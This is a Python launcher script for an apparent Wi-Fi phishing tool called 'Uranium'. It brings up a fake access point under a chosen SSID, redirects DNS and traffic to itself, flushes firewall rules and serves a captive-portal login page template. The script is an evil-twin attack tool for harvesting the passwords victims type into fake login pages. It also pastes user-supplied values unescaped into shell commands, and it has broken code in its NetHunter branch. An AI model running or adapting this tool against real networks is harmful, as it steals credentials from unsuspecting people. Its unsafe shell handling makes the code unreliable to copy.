import argparse
import os
import subprocess
import time
from modules.banner import bstring
from modules.banner import print_banner

os.system('clear')
print_banner()

parser = argparse.ArgumentParser(description='Uranium options help')
parser._action_groups.pop()
requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
requiredNamed.add_argument(
        "-i",
        "--interface",
        type=str,
        required=True,
        help=("Choose an interface that supports managed and monitor " +
            "modes for creating fake AP. " +
            "Example: -i wlan1"))
requiredNamed.add_argument(
        "-s",
        "--ssid",
        type=str,
        required=True,
        help=("Choose SSID for fake AP. " +
            "Example: -s Uranium-AP"))
requiredNamed.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Choose template to use as captive portal login page. " +
            "Example: -t captive_login. " +
            "Avaiable templates: %s" % (os.listdir('templates'))))
optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
optionalNamed.add_argument(
        "-p",
        "--port",
        type=int,
        required=False,
        help=("Choose custom port (80 by default) for python http server. " +
            "All processes on that port will be killed! " + 
            "Example: -p 80"))
optionalNamed.add_argument(
        "-n",
        "--nointernet",
        action='store_true',
        required=False,
        help=("Do not enable internet after client login successfuly. " +
            "Example: -n"))
optionalNamed.add_argument(
        "-v",
        "--verbose",
        action='store_true',
        required=False,
        help=("Option for uranium flask server. " +
            "Unhide default flask messages like GET/POST etc. " +
            "Example: -v"))
optionalNamed.add_argument(
        "-nh",
        "--nethunter",
        action='store_true',
        required=False,
        help=("Use this option on NetHunter device. " +
            "Example: -nh"))

args = parser.parse_args()

pwd = os.getcwd()

iface = args.interface
ssid = args.ssid
template = args.template
if args.nointernet is not False:
    nointernet = '-n'
else:
    nointernet = ''

if args.verbose is not False:
    verbose = '-v'
else:
    verbose = ''

print(bstring.INFO, 'Using interface:', iface)
print(bstring.INFO, 'Using SSID:', ssid)
print(bstring.INFO, 'Using template:', template)

if args.port is not None:
    server_port = args.port
    print(bstring.INFO, 'Using custom port:', server_port) 
else:
    server_port = 80
    print(bstring.INFO, 'Using default port:', server_port)

print(bstring.INFO, 'Nointernet:', args.nointernet)
print(bstring.INFO, 'Verbose:', args.verbose)

print("\n" + bstring.ACTION, "Updating configuration...")

os.system('sed -i "s/interface\=.*/interface=' + iface + '/" config/dnsmasq.conf')
os.system('sed -i "s/interface\=.*/interface=' + iface + '/" config/hostapd.conf')
os.system('sed -i "s/ssid\=.*/ssid=' + ssid + '/" config/hostapd.conf')


print(bstring.ACTION, "Stopping network services in 3s...")

os.system('''
systemctl stop NetworkManager > /dev/null 2>&1
kill $(lsof -t -i:%d) > /dev/null 2>&1
pkill dnsmasq
killall hostapd dnsmasq wpa_supplicant > /dev/null 2>&1
''' % (server_port))

time.sleep(3)

print(bstring.ACTION, "Configuring" + bstring.BLUE, iface + bstring.RESET + "...")
os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')
os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')

print(bstring.ACTION, "Starting access point...")

os.system('hostapd config/hostapd.conf -B -f %s/log/hostapd.log' % (pwd))
os.system('dnsmasq -C config/dnsmasq.conf --log-queries --log-facility=%s/log/dnsmasq.log' % (pwd))

if args.nethunter is not None:
    os.system('mount -o -rw,remount /system')
    os.system('echo "address=/#/10.0.0.1" > %s/config/dnsmasq.conf' % (pwd))
    os.system('iptables -t nat -I PREROUTING -p UDP --dport %s -j REDIRECT --to %s' % (port))


# Enable port forwarding
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

print("\n" + bstring.ACTION, "Configuring iptables...")

# Flush old iptables rules
os.system('iptables -X')
os.system('iptables -F')
os.system('iptables -t nat -F')
os.system('iptables -t nat -X')

# Enable traffic 
os.system('iptables -A INPUT -j ACCEPT')

time.sleep(1)

print(bstring.ACTION, "Deploying uranium server...")

os.system('python3 server2.py -t %s -p %d %s %s' % (template, server_port, nointernet, verbose))

print("\n" + bstring.ACTION, "Cleaning up...")

time.sleep(3)

os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
os.system('systemctl start NetworkManager > /dev/null 2>&1')
